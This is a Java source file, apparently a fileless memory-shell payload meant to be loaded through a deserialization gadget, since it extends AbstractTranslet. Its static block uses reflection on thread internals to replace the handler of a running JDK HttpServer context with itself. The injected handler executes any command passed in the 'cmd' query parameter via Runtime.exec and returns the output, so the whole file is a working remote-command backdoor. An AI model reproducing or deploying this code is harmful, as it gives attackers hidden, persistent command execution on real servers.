import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

public class shell_Handler extends AbstractTranslet implements HttpHandler {

    static {
        //获取当前线程
        Object o = Thread.currentThread();
        try {
            Field groupField = o.getClass().getDeclaredField("group");
            groupField.setAccessible(true);
            Object group = groupField.get(o);

            Field threadsField = group.getClass().getDeclaredField("threads");
            threadsField.setAccessible(true);
            Object t = threadsField.get(group);

            Thread[] threads = (Thread[]) t;
            for (Thread thread : threads){
                if(thread.getName().equals("Thread-2")){
                    Field targetField = thread.getClass().getDeclaredField("target");
                    targetField.setAccessible(true);
                    Object target = targetField.get(thread);

                    Field thisField = target.getClass().getDeclaredField("this$0");
                    thisField.setAccessible(true);
                    Object this$0 = thisField.get(target);

                    Field contextsField = this$0.getClass().getDeclaredField("contexts");
                    contextsField.setAccessible(true);
                    Object contexts = contextsField.get(this$0);

                    Field listField = contexts.getClass().getDeclaredField("list");
                    listField.setAccessible(true);
                    Object lists = listField.get(contexts);
                    java.util.LinkedList linkedList = (java.util.LinkedList) lists;

                    Object list = linkedList.get(0);

                    Field handlerField = list.getClass().getDeclaredField("handler");
                    handlerField.setAccessible(true);
                    handlerField.set(list,new shell_Handler());
                }
            }
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void handle(HttpExchange httpExchange) throws IOException {
        String resp = "Success!\n";
        String query = httpExchange.getRequestURI().getQuery();
        String[] entry = query.split("=");
        ByteArrayOutputStream bao = null;
        if(entry[0].equals("cmd")){
            InputStream inputStream = Runtime.getRuntime().exec(entry[1]).getInputStream();
            bao = new ByteArrayOutputStream();
            byte[] bytes = new byte[4096];
            int n = 0;
            while(-1 != (n = inputStream.read(bytes))){
                bao.write(bytes,0,n);
            }
        }
        resp += new String(bao.toByteArray());
        httpExchange.sendResponseHeaders(200, (long)resp.length());
        OutputStream os = httpExchange.getResponseBody();
        os.write(resp.getBytes());
        os.close();
    }
}
